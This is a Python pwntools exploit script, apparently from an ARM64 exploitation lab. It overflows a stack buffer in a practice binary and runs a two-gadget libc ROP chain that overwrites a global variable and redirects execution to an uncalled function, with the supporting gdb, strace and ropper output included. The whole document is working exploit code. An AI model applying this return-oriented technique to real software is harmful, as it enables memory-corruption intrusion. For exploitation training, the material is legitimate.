#!/usr/bin/python

"""
(gdb) disassemble main 
Dump of assembler code for function main:
   0x00000000004006fc <+0>:	stp	x29, x30, [sp, #-32]!
...
   0x0000000000400718 <+28>:	ret
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x40067c: file src/08-overwrite-global.c, line 9.
(gdb) b *0x0000000000400714
Breakpoint 2 at 0x400714: file src/08-overwrite-global.c, line 26.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/08-overwrite-global.c:9
9		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ffd30 ""
(gdb) c
Continuing.

Breakpoint 2, main (argc=1, argv=0x40007fff08) at src/08-overwrite-global.c:26
26	}
(gdb) i r $sp
sp             0x40007ffdb0	0x40007ffdb0
"""

"""
$ qemu-aarch64 -L /usr/aarch64-linux-gnu/ -strace ./bin/arm64/08-overwrite-global
...
8744 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
8744 mmap(NULL,1413976,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x0000004000852000
...
"""

"""
$ ropper --nocolor --file /usr/aarch64-linux-gnu/lib/libc-2.27.so
0x00020400: ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
0x000ec04c: str x19, [x20]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
"""

import struct
import sys

from pwn import *

context(arch='aarch64', os='linux', endian='little', word_size=64)

binary_path = './bin/arm64/08-overwrite-global'

saved_x30_addr = 0x40007ffdb0 + 8
buffer_addr = 0x40007ffd30
libc_addr = 0x0000004000852000

ldp_x19_x20_ldp_x29_x30_ret_addr = libc_addr + 0x00020400
str_x19_x20_ldp_x29_x30_ret_addr = libc_addr + 0x000ec04c

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']
x_addr = binary.symbols['x']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_x30_addr - buffer_addr)
payload += p64(ldp_x19_x20_ldp_x29_x30_ret_addr)
payload += 'b' * 16
# <- $sp
payload += p64(0) # x29
payload += p64(str_x19_x20_ldp_x29_x30_ret_addr) # x30
payload += p64(0xdeadbabebeefc0de) # x19
payload += p64(x_addr) # x20
# <- $sp
payload += p64(0) # x29
payload += p64(not_called_addr) # x30

p.readuntil('> ')
p.write(payload)
p.interactive()
